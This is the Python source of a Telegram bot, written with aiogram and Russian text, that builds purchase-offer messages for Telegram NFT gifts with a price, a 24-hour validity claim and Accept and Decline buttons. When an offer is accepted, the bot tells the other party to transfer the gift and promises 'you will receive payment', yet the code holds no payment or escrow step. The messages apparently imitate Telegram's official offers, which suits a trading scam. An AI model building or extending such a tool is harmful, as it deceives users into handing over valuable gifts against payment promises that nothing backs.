import re
import os
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, CallbackQuery
)
from aiogram.enums import ParseMode, ChatMemberStatus
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = 7856876217
CHANNEL = "@popapisa000"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

class OfferState(StatesGroup):
    waiting_for_price = State()
    waiting_for_currency = State()

# ===== Клавиатуры =====
def main_kb():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Создать оффер")],
            [KeyboardButton(text="Подписка"), KeyboardButton(text="Старт")]
        ],
        resize_keyboard=True
    )

# ===== Проверка подписки =====
async def is_subscribed(user_id: int) -> bool:
    if user_id == OWNER_ID:
        return True
    try:
        member = await bot.get_chat_member(CHANNEL, user_id)
        return member.status in [
            ChatMemberStatus.MEMBER,
            ChatMemberStatus.ADMINISTRATOR,
            ChatMemberStatus.CREATOR
        ]
    except Exception:
        return False

# ===== Старт =====
@dp.message(Command("start"))
@dp.message(F.text == "Старт")
async def start(message: types.Message):
    await message.answer(
        "Бот для создания офферов на подарки Telegram.\n\n"
        "Нажми «Создать оффер» или пришли ссылку на подарок.\n\n"
        "Также можно использовать команду:\n"
        "<code>/offer ссылка цена валюта</code>",
        reply_markup=main_kb()
    )

# ===== Подписка =====
@dp.message(F.text == "Подписка")
async def subscription_info(message: types.Message):
    if message.from_user.id == OWNER_ID:
        await message.answer("Ты владелец бота. Подписка не нужна.")
        return

    subscribed = await is_subscribed(message.from_user.id)
    if subscribed:
        await message.answer("Подписка активна. Можешь создавать офферы.")
    else:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Подписаться на канал", url="https://t.me/popapisa000")]
        ])
        await message.answer(
            "Для создания офферов нужно подписаться на канал.\n\n"
            "После подписки нажми «Создать оффер» ещё раз.",
            reply_markup=kb
        )

# ===== Создание оффера (кнопка) =====
@dp.message(F.text == "Создать оффер")
async def create_offer_btn(message: types.Message):
    if not await is_subscribed(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Подписаться на канал", url="https://t.me/popapisa000")]
        ])
        await message.answer(
            "Сначала подпишись на канал, чтобы создавать офферы.",
            reply_markup=kb
        )
        return

    await message.answer(
        "Пришли ссылку на подарок:\n"
        "<code>https://t.me/nft/Название-123</code>"
    )

# ===== Команда /offer =====
@dp.message(Command("offer"))
async def offer_command(message: types.Message):
    if not await is_subscribed(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Подписаться на канал", url="https://t.me/popapisa000")]
        ])
        await message.answer("Сначала подпишись на канал.", reply_markup=kb)
        return

    try:
        parts = message.text.split()
        if len(parts) < 4:
            await message.answer(
                "Формат:\n"
                "<code>/offer ссылка цена валюта</code>\n\n"
                "Пример:\n"
                "<code>/offer https://t.me/nft/Gift-123 17 gram</code>"
            )
            return

        link = parts[1]
        price = parts[2]
        currency = parts[3].lower()

        if not re.match(r"https?://t\.me/nft/\S+", link):
            await message.answer("Неверная ссылка на подарок")
            return
        if not price.isdigit():
            await message.answer("Цена должна быть числом")
            return
        if currency not in ["stars", "gram", "ton"]:
            await message.answer("Валюта: stars, gram или ton")
            return

        currency_text = {"stars": "Stars", "gram": "Gram", "ton": "TON"}[currency]

        text = (
            f"{link}\n\n"
            f"<b>Предложение о покупке</b>\n"
            f"этого подарка за <b>{price} {currency_text}</b>\n\n"
            f"Предложение действует ещё 24 часа"
        )

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Открыть подарок", url=link)],
            [
                InlineKeyboardButton(text="Принять", callback_data=f"accept:{message.from_user.id}:{price}:{currency}:{link}"),
                InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{message.from_user.id}")
            ]
        ])

        try:
            await message.delete()
        except:
            pass

        await message.answer(text, reply_markup=keyboard, disable_web_page_preview=False)

    except Exception:
        await message.answer("Ошибка. Проверь формат команды.")

# ===== Обычный режим (ссылка) =====
@dp.message(F.text.regexp(r"https?://t\.me/nft/\S+"))
async def got_link(message: types.Message, state: FSMContext):
    if not await is_subscribed(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Подписаться на канал", url="https://t.me/popapisa000")]
        ])
        await message.answer("Сначала подпишись на канал.", reply_markup=kb)
        return

    link = message.text.strip()
    await state.update_data(link=link)
    await state.set_state(OfferState.waiting_for_price)
    await message.answer("Введи цену (только число):")

@dp.message(OfferState.waiting_for_price)
async def got_price(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("Нужно только число. Попробуй ещё раз:")
        return

    await state.update_data(price=message.text)
    await state.set_state(OfferState.waiting_for_currency)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Stars", callback_data="cur:stars"),
            InlineKeyboardButton(text="Gram", callback_data="cur:gram"),
            InlineKeyboardButton(text="TON", callback_data="cur:ton"),
        ]
    ])
    await message.answer("Выбери валюту:", reply_markup=kb)

@dp.callback_query(F.data.startswith("cur:"))
async def got_currency(callback: CallbackQuery, state: FSMContext):
    currency = callback.data.split(":")[1]
    data = await state.get_data()
    link = data.get("link")
    price = data.get("price")
    await state.clear()

    currency_text = {"stars": "Stars", "gram": "Gram", "ton": "TON"}[currency]

    text = (
        f"{link}\n\n"
        f"<b>Предложение о покупке</b>\n"
        f"этого подарка за <b>{price} {currency_text}</b>\n\n"
        f"Предложение действует ещё 24 часа"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Открыть подарок", url=link)],
        [
            InlineKeyboardButton(text="Принять", callback_data=f"accept:{callback.from_user.id}:{price}:{currency}:{link}"),
            InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{callback.from_user.id}")
        ]
    ])

    await callback.message.answer(text, reply_markup=keyboard, disable_web_page_preview=False)
    await callback.answer()

# ===== Кнопки Принять / Отклонить =====
@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: CallbackQuery):
    parts = callback.data.split(":")
    seller_id = int(parts[1])
    price = parts[2]
    currency = parts[3]
    link = parts[4] if len(parts) > 4 else ""

    await callback.answer("Вы приняли предложение")
    await callback.message.edit_reply_markup(reply_markup=None)

    await callback.message.answer(
        "Предложение принято.\n\n"
        "Ожидайте, пока продавец передаст вам подарок."
    )

    try:
        await bot.send_message(
            seller_id,
            f"<b>Подарок продан</b>\n\n"
            f"Покупатель: @{callback.from_user.username or callback.from_user.full_name}\n"
            f"Цена: <b>{price} {currency}</b>\n"
            f"Подарок: {link}\n\n"
            f"<b>Что делать дальше:</b>\n"
            f"1. Открой подарок\n"
            f"2. Нажми «Передать»\n"
            f"3. Выбери покупателя и подтверди передачу\n\n"
            f"После передачи ты получишь оплату."
        )
    except:
        pass

@dp.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: CallbackQuery):
    parts = callback.data.split(":")
    seller_id = int(parts[1])

    await callback.answer("Вы отклонили предложение")
    await callback.message.edit_reply_markup(reply_markup=None)

    try:
        await bot.send_message(
            seller_id,
            f"Кто-то отклонил твоё предложение.\n"
            f"Пользователь: @{callback.from_user.username or callback.from_user.full_name}"
        )
    except:
        pass

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
